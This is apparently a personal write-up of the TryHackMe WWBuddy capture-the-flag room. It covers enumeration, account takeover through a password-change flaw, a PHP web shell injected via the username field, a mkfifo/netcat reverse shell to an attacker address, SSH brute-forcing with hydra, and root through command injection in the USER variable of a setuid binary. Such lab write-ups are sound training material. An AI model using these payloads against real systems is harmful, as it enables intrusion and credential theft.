<h1 align="center">WWBuddy</h1>
<p align="center">2025, October 9<br>Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>521</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Exploit this website still in development and root the room</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/efa7b7a7-0525-4a75-925c-2a61d6806130"><br>
Access it <a href="https://tryhackme.com/room/wwbuddy">here</a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/d2247e31-c5e5-4dc9-b5c7-6959fe63661f"></p>


<h2>Task 1 . WWBuddy</h2>
<p>World wide buddy is a site for making friends, but it's still unfinished and it has some security flaws.<br>

Deploy the machine and find the flags hidden in the room!<br>



This is my first room, hope you like it :D</p>

<h6></h6>﻿﻿Icon used in the room made by Icongeek26 from www.flaticon.com.</p></h6>

<p><em>Answer the questions below</em></p>

<br>
<h1 align="center">Port Scanning<a id='1'></a></h1>
<p align="center"><strong>2</strong> open ports</p>
<br>

```bash
:~/WWBuddy# nmap -sC -sV -p- -T4 xx.xxx.xx.x
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Login
|_Requested resource was http://xx.xxx.xx.x/login/
```

<br>
<h1 align="center">Web Vulberability Scanning<a id='2'></a></h1>

```bash
:~/WWBuddy# nikto -h http://xx.xxx.xx.x
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xx.x
+ Target Hostname:    xx.xxx.xx.x
+ Target Port:        80
+ Start Time:         2025-10-09 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ Cookie PHPSESSID created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ Root page / redirects to: /login
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "http://127.0.1.1/images/".
+ /config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-3092: /login/: This might be interesting...
+ OSVDB-3092: /register/: This might be interesting...
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3268: /styles/: Directory indexing found.
+ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
+ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6544 items checked: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2025-10-09 xx:xx:xx (GMT1) (7 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<br>
<h1 align="center">Directory and File Enumeration<a id='3'></a></h1>


```bash
:~/WWBuddy# gobuster dir -u http://xx.xxx.xx.x/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,log
...
...
/index.php            (Status: 302) [Size: 7740] [--> /login]
/login                (Status: 301) [Size: 310] [--> http://xx.xxx.xx.x/login/]
/register             (Status: 301) [Size: 313] [--> http://xx.xxx.xx.x/register/]
/profile              (Status: 301) [Size: 312] [--> http://xx.xxx.xx.x/profile/]
/images               (Status: 301) [Size: 311] [--> http://xx.xxx.xx.x/images/]
/header.html          (Status: 200) [Size: 577]
/admin                (Status: 301) [Size: 310] [--> http://xx.xxx.xx.x/admin/]
/footer.html          (Status: 200) [Size: 232]
/chat.php             (Status: 200) [Size: 1129]
/js                   (Status: 301) [Size: 307] [--> http://xx.xxx.xx.x/js/]
/api                  (Status: 301) [Size: 308] [--> http://xx.xxx.xx.x/api/]
/logout.php           (Status: 302) [Size: 0] [--> /login]
/config.php           (Status: 200) [Size: 0]
/styles               (Status: 301) [Size: 311] [--> http://xx.xxx.xx.x/styles/]
/change               (Status: 301) [Size: 311] [--> http://xx.xxx.xx.x/change/]
...
Progress: 873100 / 873104 (100.00%)
```

<p align="">/admin/</p>

```bash
:~/WWBuddy# gobuster dir -u http://xx.xxx.xx.x/admin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,log
...
/index.php            (Status: 403) [Size: 78]
/access.log           (Status: 200) [Size: 568]
Progress: 873100 / 873104 (100.00%)
```

<p align="">/api/</p>

```bash
:~/WWBuddy# gobuster dir -u http://xx.xxx.xx.x/api/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,log
...
/messages             (Status: 301) [Size: 317] [--> http://xx.xxx.xx.x/api/messages/]
Progress: 873100 / 873104 (100.00%)
```

<p align="">/api/messages/</p>

```bash
:~/WWBuddy# gobuster dir -u http://xx.xxx.xx.x/api/messages/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,log
...
/index.php            (Status: 200) [Size: 23]
...
Progress: 873100 / 873104 (100.00%)
```

<p align="">/change</p>

```bash
:~/WWBuddy# gobuster dir -u http://xx.xxx.xx.x/change/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,log
...
/index.php            (Status: 200) [Size: 1906]
Progress: 873100 / 873104 (100.00%)
```

<br>
<h1 align="center">Host Name Mapping<a id='4'></a></h1>

```bash
xx.xxx.xx.x wwbuddy.thm
```

<br>
<h1 align="center">Web Interface Inspection<a id='5'></a></h1>
<br>
<p align="center">wwbuddy.thm--> wwbuddy.thm/login/</p>

<img width="1102" height="353" alt="image" src="https://github.com/user-attachments/assets/91c4ada8-9652-4583-ab38-27ed4d7b9760" />

<br>
<br>
<br>

<img width="1122" height="418" alt="image" src="https://github.com/user-attachments/assets/38ff78bb-4a59-4803-89da-a2856a84e3ef" />

<br>
<br>
<br>
<p align="center">/admin/<br>You dont have permissions to access this file, this incident will be reported.

<br>
<br>
<br>
<p align="center">Launched Burp Suite<br>/login</p>

<img width="1099" height="356" alt="image" src="https://github.com/user-attachments/assets/d1580e5c-0344-4fc1-84fd-dee7d0013434" />

<br>
<br>
<br>
<p align="center">Sign Up --> register --> Login --> Burp Suite and FoxyProxy</p>

<img width="1118" height="450" alt="image" src="https://github.com/user-attachments/assets/bf0cab4a-3b5d-4931-bd3e-b7cb64f528cd" />

<br>
<br>
<br>
<p align="center">Edit Info. Complete fields. Save. Analyze captures.<br>Change password. Save.</p>
  
<img width="1130" height="319" alt="image" src="https://github.com/user-attachments/assets/43a6f5d4-762a-4575-b7b0-8cde12260b33" />

<br>
<br>
<br>
<p align="center">Access Roberto´s profile with the password just updated.</p>

<img width="1039" height="610" alt="image" src="https://github.com/user-attachments/assets/151f33f1-94ab-4be9-b416-2b6632a91102" />

<br>
<br>
<br>

<img width="1099" height="342" alt="image" src="https://github.com/user-attachments/assets/7b2ece05-9f51-4747-b066-51eb98f2b66e" />

<br>
<br>
<br>
<p align="center">Access WWBuddy´s profile with the password just updated.</p>

<img width="1086" height="619" alt="image" src="https://github.com/user-attachments/assets/5afc58c2-e975-404e-9b63-985acec475a9" />

<br>
<br>
<br>
<p align="center">Access Henry´s profile with the password just updated.</p>

<img width="1123" height="601" alt="image" src="https://github.com/user-attachments/assets/5f1dc8bf-294f-4c61-9de4-ab6863c0d7b6" />

<br>
<br>
<br>
<p align="center">Identify the first flag navigating to /admin with Henry´s privileges.</code></p>

<img width="1131" height="355" alt="image" src="https://github.com/user-attachments/assets/d51edb64-ab4e-4cf7-a9e4-54e63fcbd3a5" />

<br>
<br>
<br>
<p>1.1. User flag<br>
<code>THM{****_***_********_*****}</code></p>
<br>
<br>
<br>
<p align="center">Edit username as following.</p>

```bash
<?php system('id') ?>
```

<br>
<p align="center">Navigate to /admin.</p>

<img width="1116" height="85" alt="image" src="https://github.com/user-attachments/assets/979beb84-7fc5-48bc-a773-71296ae8456e" />

<br>
<p align="center">Edit username as following.</p>

```bash
<?php system($_GET['cmd']); ?>
```

<br>
<p align="center">Set up listener.<br>Send a reverse shell.</p>

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xx.xxx.xx.xx 9001 >/tmp/f
```

<br>
<br>
<h1 align="center">Initial Foothold<a id='6'></a></h1>

<br>
<p align="center">roberto, jenny, root</p>

```bash
www-data@wwbuddy:~$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
wwbuddy:x:1000:1000:WWBuddy:/home/wwbuddy:/bin/bash
```

```bash
www-data@wwbuddy:~$ cat /etc/passwd | grep /bin/sh
roberto:x:1001:1001::/home/roberto:/bin/sh
jenny:x:1002:1002::/home/jenny:/bin/sh
```

```bash
www-data@wwbuddy/var/log/mysql:~$ ls
error.log  general.log
```

<br>
<p align="center">roberto:•••••••••••••••</p>

```bash
www-data@wwbuddy/var/log/mysql:~$ cat general.log  | grep -i roberto
2020-07-25T15:01:40.143760Zsql$    12 ExecutemysSELECT id, username, password FROM users WHERE username = 'Roberto•••••••••••••••'
2020-07-25T15:02:00.019056Z	   13 Execute	SELECT id, username, password FROM users WHERE username = 'Roberto'
```

<br>
<h1 align="center">Privilege Escalation & User Flag.txt<a id='1'></a></h1>

```bash
:~/WWBuddy# ssh roberto@wwbuddy.thm
```

```bash
$ whoami
roberto
```

```bash
$ pwd
/home/roberto
```

```bash
$ which python3
/usr/bin/python3
```

```bash
$ python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
```

```bash
roberto@wwbuddy:~$ 
```

```bash
roberto@wwbuddy:~$ ls
importante.txt
```

```bash
roberto@wwbuddy:~$ cat importante.txt
A Jenny vai ficar muito feliz quando ela descobrir que foi contratada :DD

Não esquecer que semana que vem ela faz 26 anos, quando ela ver o presente que eu comprei pra ela, talvez ela até anima de ir em um encontro comigo.


THM{****_**_****}
```

<img width="1177" height="727" alt="image" src="https://github.com/user-attachments/assets/4baa42b2-dafe-4f45-9395-c1f00e53f8fd" />

<br>
<br>
<br>

<br>
<p>1.2. User flag<br>
<code>THM{****_**_****}</code></p>
<br>

<br>
<h1 align="center">Privilege Escalation & Root Flag.txt<a id='10'></a></h1>

```bash
roberto@wwbuddy:~$ sudo -l
[sudo] password for roberto: 
Sorry, user roberto may not run sudo on wwbuddy.
```

```bash
roberto@wwbuddy:/home$ ls
jenny  roberto  wwbuddy
```

<br>
<p align="center">Execute linpeas.sh</p>

<img width="887" height="620" alt="image" src="https://github.com/user-attachments/assets/28a1a715-4fd7-47e4-b00e-1ff7b5d1fef8" />

<br>
<br>
<br>

<img width="533" height="379" alt="image" src="https://github.com/user-attachments/assets/30b04653-0946-403c-a017-4a090a1d27ff" />

<br>
<br>
<br>

```bash
roberto@wwbuddy:~$ ls -lah
total 40K
drwx------ 6 roberto roberto 4.0K Oct  9 20:55 .
drwxr-xr-x 5 root    root    4.0K Jul 28  2020 ..
-rw------- 1 roberto roberto    0 Jul 28  2020 .bash_history
-rw-r--r-- 1 roberto roberto  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 roberto roberto 3.7K Apr  4  2018 .bashrc
drwx------ 2 roberto roberto 4.0K Oct  9 xx:xx .cache
drwxr-x--- 3 roberto roberto 4.0K Oct  9 xx:xx .config
drwx------ 4 roberto roberto 4.0K Oct  9 20:56 .gnupg
-rw-rw-r-- 1 roberto roberto  246 Jul 27  2020 importante.txt
drwxrwxr-x 3 roberto roberto 4.0K Jul 27  2020 .local
-rw-r--r-- 1 roberto roberto  807 Apr  4  2018 .profile
```

```bash
roberto@wwbuddy:~$ stat importante.txt
  File: importante.txt
  Size: 246       	Blocks: 8          IO Block: 4096   regular file
Device: 10303h/66307d	Inode: 402577      Links: 1
Access: (0664/-rw-rw-r--)  Uid: ( 1001/ roberto)   Gid: ( 1001/ roberto)
Access: 2025-10-09 xx:xx:xx.356000000 +0000
Modify: 2020-07-27 21:25:48.544379536 +0000
Change: 2020-07-27 21:25:48.544379536 +0000
 Birth: -
```

```bash
:~/WWBuddy# nano dates.txt
```

<br>
<br>
<p align="center">jenny:♥♥/♥♥/♥♥♥♥</p>

```bash
:~/WWBuddy# hydra -l jenny -P dates.txt wwbuddy.thm ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-09 xx:xx:xx
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:1/p:10), ~1 try per task
[DATA] attacking ssh://wwbuddy.thm:22/
[22][ssh] host: wwbuddy.thm   login: jenny   password: ♥♥/♥♥/♥♥♥♥
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-09 xx:xx:xx
```

<img width="1361" height="211" alt="image" src="https://github.com/user-attachments/assets/0587f31c-f262-485d-a1e9-9838f7722d77" />

<br>
<br>
<br>

```bash
jenny@wwbuddy:~$su jenny
```

```bash
jenny@wwbuddy:~$ ls -lah
total 28K
drwx------ 4 jenny jenny 4.0K Oct  9 21:05 .
drwxr-xr-x 5 root  root  4.0K Jul 28  2020 ..
-rw-r--r-- 1 jenny jenny  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 jenny jenny 3.7K Apr  4  2018 .bashrc
drwx------ 2 jenny jenny 4.0K Oct  9 21:05 .cache
drwx------ 3 jenny jenny 4.0K Oct  9 21:05 .gnupg
-rw-r--r-- 1 jenny jenny  807 Apr  4  2018 .profile
```

<br>
<p align="center">Identify /bin/authenticate</p>

```bash
jenny@wwbuddy:/$ find / -perm -4000 -type f 2>/dev/null
...
/bin/authenticate
/bin/fusermount
/bin/ping
/bin/mount
/bin/umount
/bin/su
...
```

<br>
<p align="center">Identify /bin/authenticate</p>

```bash
jenny@wwbuddy:/$ find / -perm -4000 -type f -ls 2>/dev/null
...
   267949     12 -rwsr-xr-x   1 root     root                8584 Jul 28  2020 /bin/authenticate
   393976     32 -rwsr-xr-x   1 root     root               30800 Aug 11  2016 /bin/fusermount
   394027     64 -rwsr-xr-x   1 root     root               64424 Jun 28  2019 /bin/ping
   394003     44 -rwsr-xr-x   1 root     root               43088 Jan  8  2020 /bin/mount
   394061     28 -rwsr-xr-x   1 root     root               26696 Jan  8  2020 /bin/umount
   394043     44 -rwsr-xr-x   1 root     root               44664 Mar 22  2019 /bin/su
...
```

<br>
<p align="center">Identify /bin/authenticate</p>

<img width="1266" height="145" alt="image" src="https://github.com/user-attachments/assets/4cb65892-4ba9-456a-aa97-4bc8aeeda645" />

<br>
<br>
<br>

```bash
jenny@wwbuddy:/bin$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
xx.xxx.xx.xxx - - [09/Oct/2025 xx:xx:xx] "GET /authenticate HTTP/1.1" 200 -
```

```bash
:~/WWBuddy# file authenticate
authenticate: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=..., not stripped
```

<br>
<p align="center">Binary Analysis</p>

<img width="631" height="461" alt="image" src="https://github.com/user-attachments/assets/74676e57-8e48-44be-959b-cf44bc623abd" />

<br>
<br>
<br>

<img width="1049" height="562" alt="image" src="https://github.com/user-attachments/assets/53ddc85d-50a6-489e-9e6b-ba83e2f86527" />

<br>
<br>
<br>

<img width="1202" height="248" alt="image" src="https://github.com/user-attachments/assets/c1158bf6-4010-4341-948d-71fd6aa27103" />

<br>
<br>
<br>

<p align="center">function main<br> __src = <code>getenv</code>("USER");</p>

```bash
undefined8 main(void)

{
  __uid_t __uid;
  int iVar1;
  char *__src;
  long in_FS_OFFSET;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined4 local_20;
  undefined local_1c;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  __uid = getuid();
  if ((int)__uid < 1000) {
    puts("You need to be a real user to be authenticated.");
  }
  else {
    iVar1 = system("groups | grep developer");
    if (iVar1 == 0) {
      puts("You are already a developer.");
    }
    else {
      __src = getenv("USER");
      __uid = getuid();
      setuid(0);
      local_48 = 0x20646f6d72657375;
      local_40 = 0x6c6576656420472d;
      local_38 = 0x207265706f;
      local_30 = 0;
      local_28 = 0;
      local_20 = 0;
      local_1c = 0;
      strncat((char *)&local_48,__src,0x14);
      system((char *)&local_48);
      puts("Group updated");
      setuid(__uid);
      system("newgrp developer");
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

<img width="1346" height="560" alt="image" src="https://github.com/user-attachments/assets/00f9ef80-16df-4c92-bf21-a84583391879" />

<br>
<br>
<br>

```bash
jenny@wwbuddy:/bin$ env
...
XDG_SESSION_ID=7
USER=jenny
PWD=/bin
HOME=/home/jenny
...
```

```bash
jenny@wwbuddy:/bin$ echo $USER
jenny
```

```bash
jenny@wwbuddy:/bin$ export USER='jenny; bash'
```

```bash
jenny@wwbuddy:/bin$ authenticate
```

```bash
root@wwbuddy:/bin# cd /root
```

```bash
root@wwbuddy:/root# ls
root.txt
```

```bash
root@wwbuddy:/root# cat root.txt
THM{******_***_***********}
```

<img width="1265" height="183" alt="image" src="https://github.com/user-attachments/assets/5d183a9b-9d91-4a88-8a5f-b5c5e92e075b" />

<br>
<br>
<br>
<p>1.3. Root flag<br>
<code>THM{******_***_***********}</code></p>
<br>
<br>
<br>
<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/6c116da1-7455-4bd2-88cc-831df38cdeab"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/0237f518-4181-4ef6-98df-ea43a220950d"></p>

<h1 align="center">My TryHackMe Journey ・ 2025, October</h1>

<div align="center"><h6>

| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
|:------:|:--------------------------------------|--------:|------------:|------------:|------------:|------------:|------------:|------------:|------------:|
|9       |Medium 🚩 - WWBuddy                    | 521    |     103ʳᵈ    |      4ᵗʰ     |     390ᵗʰ    |     4ᵗʰ    | 129,293  |    995    |    76     |
|8       |Hard 🚩 - Motunui                      | 520    |     103ʳᵈ    |      4ᵗʰ     |     383ʳᵈ    |     4ᵗʰ    | 129,201  |    994    |    76     |
|8       |Easy 🔗 - Man-in-the-Middle            | 520    |     103ʳᵈ    |      4ᵗʰ     |     390ᵗʰ    |     4ᵗʰ    | 129,141  |    993    |    76     |
|7       |Medium 🚩 - Profiles, in progress      | 519    |              |              |              |            | 129,021  |    992    |    76     |
|6       |Medium 🚩 - VulnNet                    | 518    |     105ᵗʰ    |      4ᵗʰ     |     348ᵗʰ    |     5ᵗʰ    | 129,021  |    992    |    76     |
|6       |Easy 🚩 - DearQA                       | 518    |     105ᵗʰ    |      4ᵗʰ     |     333ʳᵈ    |     6ᵗʰ    | 128,991  |    991    |    76     |
|5       |Medium 🚩 - Frank & Herby try again.....| 517   |     106ᵗʰ    |      4ᵗʰ     |     300ᵗʰ    |     5ᵗʰ    | 128,931  |    990    |    76     |
|4       |Medium 🚩 - Frank & Herby make an app  | 516    |     105ᵗʰ    |      4ᵗʰ     |     233ʳᵈ    |     3ʳᵈ    | 128,871  |    989    |    76     |
|4       |Info ℹ️ - OverlayFS - CVE-2021-3493    | 516    |     105ᵗʰ    |      4ᵗʰ     |     235ᵗʰ    |     3ʳᵈ    | 128,841  |    988    |    76     |
|3       |Medium 🚩 - XDR: Operation Global Dagger2| 515  |     104ᵗʰ    |      4ᵗʰ     |     149ᵗʰ    |     3ʳᵈ    | 128,833  |    987    |    76     |
|3       |Medium 🚩 - VulnNet: dotpy             | 515    |     108ᵗʰ    |      4ᵗʰ     |     741ˢᵗ    |    11ˢᵗ    | 128,563  |    986    |    76     |
|2       |Medium 🔗 - Data Exfiltration Detection| 514    |     108ᵗʰ    |      4ᵗʰ     |     521ˢᵗ    |     8ᵗʰ    | 128,503  |    985    |    76     |
|1       |Medium 🔗 - Network Discovery Detection| 513    |     108ᵗʰ    |      4ᵗʰ     |     875ᵗʰ    |     7ᵗʰ    | 128,407  |    984    |    76     |
|1       |Medium 🚩 - Intranet                   | 513    |     108ᵗʰ    |      4ᵗʰ     |    3,357ᵗʰ   |    57ᵗʰ    | 128,335  |    983    |    76     |

</h6></div>

<br>

<p align="center">Global All Time:   103ʳᵈ<br><img width="250px" src="https://github.com/user-attachments/assets/ae7beef6-21e2-4aa0-bec1-c68eb7808fd3"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/7b3f36e2-34dc-4804-bf6f-f59853c495cd"><br><br>
                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/171fe320-5b90-42a1-a172-d2398d47763e"><br>
                  Global monthly:     390ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/97d757bf-f8c7-49f6-82d6-717bdb91cf4e"><br>
                  Brazil monthly:       4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/06889753-7c73-4539-bb7a-f116915ab998"><br>
